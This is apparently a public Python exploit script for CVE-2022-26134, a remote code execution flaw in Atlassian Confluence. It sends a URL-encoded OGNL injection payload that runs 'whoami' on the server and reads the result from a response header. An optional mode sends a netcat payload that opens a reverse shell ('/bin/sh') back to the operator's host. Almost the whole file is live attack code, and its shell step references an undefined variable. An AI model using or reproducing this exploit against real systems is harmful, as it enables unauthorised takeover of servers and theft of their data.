#!/user/bin/python
# -*- coding: utf-8 -*-
# Scan for CVE-2022-26134 (spawn shell is unreliable, use with care)
# Dependencies: requests, argparse
# Tested: Python 2.7 - 3.7, win/nix
# usage: python confluenceRCE.py -t 127.0.0.1, add port (if not 443) after ip:port, or with -p
# Author(tool): twitter.com/haxel0rd

import signal
import requests
from argparse import ArgumentParser
from requests.exceptions import Timeout, TooManyRedirects
from requests import Request, urllib3; urllib3.disable_warnings() # disable annoying ssl warnings

# Catch signal interrupts 
earlyExit = False
def sigHandler(sig,frame):
  print('** User requested exit, and so we shall ..')
  print('** May the force be with you.\n\n')
  exit()
signal.signal(signal.SIGINT,sigHandler)

parser = ArgumentParser(description='Halp output..\n')
parser.add_argument('-t','--target',  help='set target base url or ip')
parser.add_argument('-p','--port', help='port (default=443)')
parser.add_argument('-s','--shell', help='try\'s to open a netcat reverse shell (-s ip)')
parser.add_argument('-c','--timeout', help='timeout in seconds (default=7)')
args = parser.parse_args()

payload = '%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Referer%22%2C%23a%29%29%7D/'
payload_nc = '%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nc%20{{address}}%20{{port}}%20%2de%20%2fbin%2fsh%22%29%7D/'

print('\n\n ################################################################################')
print(' #                                                                              #')
print(' #      ____             __ _                             ____   ____ _____     #')
print(' #     / ___|___  _ __  / _| |_   _  ___ _ __   ___ ___  |  _ \ / ___| ____|    #')
print(' #    | |   / _ \| \'_ \| |_| | | | |/ _ \ \'_ \ / __/ _ \ | |_) | |   |  _|      #')
print(' #    | |__| (_) | | | |  _| | |_| |  __/ | | | (_|  __/ |  _ <| |___| |___     #')
print(' #     \____\___/|_| |_|_| |_|\__,_|\___|_| |_|\___\___| |_| \_\\\____|_____|    #')
print(' #                                                                              #')
print(' #                   ~ Atlassian Confluence & DataCenter RCE ~                  #')
print(' #                  check target for presence of CVE-2022-26134                 #')
print(' #                      Author(tool): twitter.com/haxel0rd                      #')
print(' #                                                                              #')
print(' ################################################################################\n\n')
print(' ** Running checks ...')

vuln = ''                                                                     
protocol=''
tout=7  # default (tool)
port = 443 # default (tool), 8090 (confluence)
target=args.target
if not target:
  print(' ** ERROR: you must provide a target url or ip address (-t)\n\n')
  exit()
try:
  tryBreakOut = target.split('://')[1]     # throws error, breaks into except (genious logic lol)
  protocol = target.split('://')[0]+'://'  # if we are still executing in this line, then url was applied protocol handler
except:
  protocol = 'https://'
host = target.replace('http://','').replace('https://','')
try:
  host = host.split('/')[0]
except:
  pass
try:
  port = host.split(':')[1]
except:
  pass
try:
  host = host.split(':')[0]
except:
  pass
if args.timeout:
    try:
      tout = int(args.timeout)
    except:
      print(' ** ERROR: timeout (-c) must be a number, fallback to default (7)')
      tout = 7
if args.port:
  try:
    port = int(args.port)
  except:
    print(' ** ERROR: port (-p) must be a number, fallback to default (443)\n\n')
    exit()
undetected = False
target = protocol+host+':'+str(port)+'/'+payload
header = {'Host':host,'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36','Accept':'*/*'}
try:
  response = requests.head(target,allow_redirects=False,verify=False,timeout=tout,headers=header)
except Timeout:
  print(' ** ERROR: Connection timed out (maybe firewalled), try using (-c) 20 (sets timeout to 20 sec)\n\n')
  exit()
except TooManyRedirects:
  print(' ** ERROR: Target keeps redirecting us\n\n')
  exit()
except:
  # this could happen when user applies no protocol handler to target url, and target is running http (as this tool uses https by default)
  target = target.replace('https://','http://')
  try:
    response = requests.head(target,allow_redirects=False,verify=False,timeout=tout,headers=header)
  except:
    undetected = True
try:
  vuln = response.headers['X-Referer']
except:
  pass
if not vuln:
  if undetected:
    print(' ** ERROR: Confluence not available under this address/port.')
  else:
    print(' ** Target is not vulnerable.')
else:
  print(' >> Target is ==VULNERABLE!==')
  print('    -------------------------')
if not args.shell:
  print('\n\n')
else:
  rport = 4444
  while True:
    try:
      rport = input(' ** Running in shell mode, choose port number for reverse connect: ')
      rport = int(rport)
      if rport > 65535 or rport < 1:
        print(' ** ERROR: port must range between 1 - 65535')
      else:
        break
    except:
      print(' ** ERROR: port must be a number, try again ...')
  print(' ** We are done, run "nc -lvp '+str(rport)+'" on your server.')
  print('    If successfull, the target will conect to your machine.')
  print('    Make sure the correct ip was provided with (-s) option. ')
  print('    Also: ...make sure that ports on your machine are open. ')
  print(' ** Attempting to spawn shell ...')
  payload_nc = payload_nc.replace('{{address}}',str(args.shell)).replace('{{port}}',str(rport))
  target = protocol+host+':'+str(port)+'/'+payload_nc
  try:
    response = requests.head(target,allow_redirects=False,verify=False,timeout=timeout,headers=header)
    print(' ** Payload sent, there should have popped a shell now on your')
    print('    listening machine \''+args.shell+'\'. If not, then the target')
    print('    has probably no netcat installed ¯\_(ö)_/¯\n\n')
  except:
    print(' ** ERROR: Something went wrong with sending the shell payload :[')
    print('           (no shell has been created)\n\n')
